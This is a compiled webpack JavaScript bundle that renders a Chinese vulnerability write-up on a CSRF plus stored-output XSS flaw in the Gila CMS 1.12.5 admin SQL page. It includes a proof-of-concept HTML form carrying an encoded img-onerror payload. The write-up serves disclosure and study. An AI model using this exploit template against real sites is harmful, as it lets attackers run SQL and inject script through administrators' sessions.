(window.webpackJsonp=window.webpackJsonp||[]).push([[4],{179:function(t,s,a){t.exports=a.p+"assets/img/20200514172509.85c73489.jpg"},180:function(t,s,a){t.exports=a.p+"assets/img/20200514173143.67b32891.jpg"},185:function(t,s,a){"use strict";a.r(s);var e=a(6),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h2",{attrs:{id:"gila-cms-1-12-5-csrf-xss-漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#gila-cms-1-12-5-csrf-xss-漏洞"}},[t._v("#")]),t._v(" Gila CMS 1.12.5 CSRF+XSS 漏洞")]),t._v(" "),e("h3",{attrs:{id:"一、漏洞摘要"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#一、漏洞摘要"}},[t._v("#")]),t._v(" 一、漏洞摘要")]),t._v(" "),e("blockquote",[e("p",[t._v("漏洞名称：Gila CMS 1.12.5 CSRF+XSS 漏洞")]),t._v(" "),e("p",[t._v("上报日期：2020-05-14")]),t._v(" "),e("p",[t._v("漏洞发现者：laot")]),t._v(" "),e("p",[t._v("版本：V1.12.5")])]),t._v(" "),e("h3",{attrs:{id:"二、漏洞概述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#二、漏洞概述"}},[t._v("#")]),t._v(" 二、漏洞概述")]),t._v(" "),e("p",[t._v("后台执行SQL语句处没有进行token验证，导致csrf漏洞的发生，且结果输出未进行过滤，导致xss漏洞的发生。构造对应的exp可执行xss payload。")]),t._v(" "),e("p",[t._v("文件:/src/core/views/admin/sql.php")]),t._v(" "),e("p",[e("img",{attrs:{src:a(179),alt:""}})]),t._v(" "),e("p",[t._v("构造如下代码，保存为html文件并打开，将成功触发漏洞。")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('<html>\n  <body>\n    <form action="http://gila.test/admin/sql" method="POST">\n      <input type="hidden" name="query" value="select&#32;&apos;&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;&#47;xss&#47;&#41;&#32;&#47;&gt;&apos;&#59;" />\n      <input type="submit" value="Submit request" />\n    </form>\n  </body>\n</html>\n')])])]),e("p",[e("img",{attrs:{src:a(180),alt:""}})])])}),[],!1,null,null,null);s.default=r.exports}}]);